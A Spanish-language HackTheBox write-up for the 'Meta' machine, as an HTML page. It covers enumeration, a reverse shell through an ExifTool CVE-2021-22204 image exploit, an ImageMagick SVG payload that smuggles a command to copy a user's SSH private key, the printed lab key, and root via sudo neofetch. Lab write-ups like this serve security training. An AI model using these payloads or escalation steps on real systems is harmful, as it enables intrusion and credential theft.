@@ -1,0 +1,215 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Meta HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/meta.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Meta HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Meta de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Meta de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Meta HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Meta HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Meta de la plataforma de HackTheBox","headline":"Writeup Meta HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Meta HackTheBox</h1>
+          <p>Resolución de la máquina Meta de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ nmap</span><span class="p"> 10.10.11.140
+Nmap scan report for 10.10.11.140
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Si vamos a la web no es que encontremos mucho por lo que buscaremos subdominios</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> vhost -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100
+===============================================================
+[+] Threads:      100
+[+] Url:          http://artcorp.htb
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: <span class="kd">dev01.artcorp.htb</span><span class="p"> (Status: 200) [Size: 247]</span>
+</code></pre></div></div> 
+
+<div><p>Lo agregamos al /etc/hosts y si vamos a dev01.artcorp.htb nos encontramos esto</p></div>
+<div><p><img src="./1.png"><p></div>
+<div><p>Damos click a MetaView y nos lleva a la siguiente pagina donde podemos subir imagenes</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Aprovechandonos del siguiente <a href="https://github.com/convisolabs/CVE-2021-22204-exiftool">exploit</a> vamos a crear una imagen con una reverse shell</p></div>
+<div><p>Solo en el exploit.py cambiamos la ip y puerto, lo ejecutamos y nos crea una imagen con una reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">ip </span><span class="kd">= </span><span class="s2">'10.10.14.10'</span><span class="p">
+port </span><span class="kd">= </span><span class="s2">'443'</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> exploit.py
+    1 image files updated
+</code></pre></div></div>
+
+<div><p>Ahora al subirla en la web, recibiremos una reverse shell por el puerto especificado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 10.10.11.140
+</span><span class="s2">www-data@meta</span><span class="p">:</span><span class="na">/var/www/dev01.artcorp.htb/metaview</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si con <a href="https://github.com/DominicBreuker/pspy">pspy </a>enumeramos procesos vemos que el uid 1000 ejecuta cada minuto lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">CMD: UID=1000 PID=29752  | /bin/bash /usr/local/bin/convert_images.sh
+CMD: UID=1000 PID=29753  | /usr/local/bin/mogrify -format png *.*
+CMD: UID=1000 PID=29754  | pkill mogrify</span>
+</code></pre></div></div>
+
+<div><p>Si miramos el uid 1000 es thomas y convert_images.sh a su vez ejecuta mogrify en el directorio /var/www/dev01.artcorp.htb/convert_images</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/passwd | grep 1000
+thomas:x:</span><span class="kd">1000</span><span class="p">:</span><span class="kd">1000</span><span class="p">:thomas,,,:/home/thomas:/bin/bash
+</span><span class="s2">www-data@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /usr/local/bin/convert_images.sh
+#!/bin/bash
+cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
+pkill mogrify
+</span><span class="s2">www-data@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Seguiremos la siguiente<a href=https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html> guía</a> y usaremos el exploit integro solo cambiando el comando "id" por "cat ~/.ssh/id_rsa" y la ruta a depositarlo de "." a "/dev/shm" al final quedaria algo así</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt;<span class="kd">image</span> <span class="k">authenticate<span class="p">=</span><span class="s">'ff" `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/0wned`;"'</span><span class="p">&gt;</span>
+  <span class="p">&lt;<span class="kd">read</span> <span class="k">filename</span><span class="p">=</span><span class="s">"pdf:/etc/passwd"</span><span class="p">/&gt;</span>
+  <span class="p">&lt;<span class="kd">get</span> <span class="k">width</span><span class="p">=</span><span class="s">"base-width"</span> <span class="k">height</span><span class="p">=</span><span class="s">"base-height"</span> <span class="p">/&gt;</span>
+  <span class="p">&lt;<span class="kd">resize</span> <span class="k">geometry</span><span class="p">=</span><span class="s">"400x400"</span> <span class="p">/&gt;</span>
+  <span class="p">&lt;<span class="kd">write</span> <span class="k">filename</span><span class="p">=</span><span class="s">"test.png"</span> <span class="p">/&gt;</span>
+  <span class="p">&lt;<span class="kd">svg</span> <span class="k">width</span><span class="p">=</span><span class="s">"700"</span> <span class="k">height</span><span class="p">=</span><span class="s">"700"</span> <span class="k">xmlns</span><span class="p">=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="k">xmlns:xlink</span><span class="p">=</span><span class="s">"http://www.w3.org/1999/xlink"</span><span class="p">&gt;</span>
+  <span class="p">&lt;<span class="kd">image</span> <span class="k">xlink:href</span><span class="p">=</span><span class="s">"msl:poc.svg"</span> <span class="k">height</span><span class="p">=</span><span class="s">"100"</span> <span class="k">width</span><span class="p">=</span><span class="s">"100"</span><span class="p">/&gt;</span>
+  <span class="p">&lt;/<span class="kd">svg<span class="p">&gt;</span>
+<span class="p">&lt;/<span class="kd">image<span class="p">&gt;</span>
+</code></pre></div></div>
+
+<div><p>En la carpeta convert_images vamos a poner el contenido dentro de un archivo que se llame poc.svg en espera a que thomas ejecute la tarea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@meta<span class="p">:</span><span class="na">/var/www/dev01.artcorp.htb/convert_images<span class="p">$ ls
+poc.svg</span>
+<span class="s2">www-data@meta<span class="p">:</span><span class="na">/var/www/dev01.artcorp.htb/convert_images<span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Pasado un minuto si revisamos /dev/shm tenemos la id_rsa de thomas</p></div>
+
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@meta<span class="p">:</span><span class="na">/dev/shm<span class="p">$ ls
+0wned</span>
+<span class="s2">www-data@meta<span class="p">:</span><span class="na">/dev/shm<span class="p">$ cat 0wned
+-----BEGIN OPENSSH PRIVATE KEY----- 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 bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE= -----END OPENSSH PRIVATE KEY-----
+<span class="s2">www-data@meta<span class="p">:</span><span class="na">/dev/shm<span class="p">$</span>
+</code></pre></div></div>
+<div><p>Si cambiamos los espacios por saltos de linea nos queda en mejor formato</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">-----BEGIN OPENSSH PRIVATE KEY-----
+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
+bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
+-----END OPENSSH PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Ahora podemos conectarnos por ssh como el usuario thomas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> thomas@10.10.11.140 -i id_rsa
+<span class="s2">thomas@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+d8b*************************9f2
+</span><span class="s2">thomas@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ya como el usuario thomas podemos ejecutar neofetch con sudo sin proporcionar contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">thomas@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+Matching Defaults entries for thomas on meta:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME
+
+User thomas may run the following commands on meta:
+    (root) NOPASSWD: /usr/bin/neofetch \"\"
+</code></pre></div></div>
+
+<div><p>Tambien nos dice lo siguiente "env_keep+=XDG_CONFIG_HOME" con esto podemos cambiar la ruta para que tome la nuestra y en el archivo de configuracion de neofetch meter un comando asi ganamos acceso a root de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">thomas@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$ export XDG_CONFIG_HOME=~/.config</span>
+<span class="s2">thomas@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$ echo "bash" >> ~/.config/neofetch/config.conf</span>
+<span class="s2">thomas@meta</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo neofetch</span>
+<span class="s2">root@meta</span><span class="p">:</span><span class="na">/home/thomas</span><span class="p"># cat /root/root.txt
+859**************************f5c</span>
+<span class="s2">root@meta</span><span class="p">:</span><span class="na">/home/thomas</span><span class="p">#</span>
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
